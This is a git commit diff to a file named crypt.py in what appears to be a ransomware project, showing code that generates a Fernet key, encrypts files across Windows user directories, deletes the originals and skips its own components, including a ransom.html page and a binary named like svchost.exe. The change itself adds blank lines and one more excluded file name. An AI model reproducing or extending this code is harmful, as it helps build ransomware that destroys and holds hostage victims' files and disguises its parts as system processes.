a2014ba12bd3e2bf437fdca2c97e492488787803
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-12 23:45:47 +0100

    Update crypt.py

--- modules/crypt/crypt.py
+++ modules/crypt/crypt.py
@@ -2,15 +2,18 @@
 #coding:utf-8
 from cryptography.fernet import Fernet
 import os
+
 # ENVIRONMENT VARIABLE
 usr = os.environ["USERNAME"]
 usrkey = "{}.key".format(usr)
+
 # GENERATE KEY FUNCTION
 def genkey(name):
     global key
     key = Fernet.generate_key()
     with open(usrkey, "wb") as file:
         file.write(key)
+        
 # FILE ENCYPTING FUNCTION
 def file_ecrypt(key, name):
     with open(name,'rb') as files:
@@ -26,6 +29,7 @@ def file_ecrypt(key, name):
         os.remove(name)
     except:
         pass
+    
 # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
 def filelist():
     rep = ['\\Users\\']
@@ -33,7 +37,7 @@ def filelist():
         for root, dirs, files in os.walk(user):
             for file in files:
                 my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
-                "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
+                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                 "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                 if not(file in my_files):
                     for ext in file.split("."):
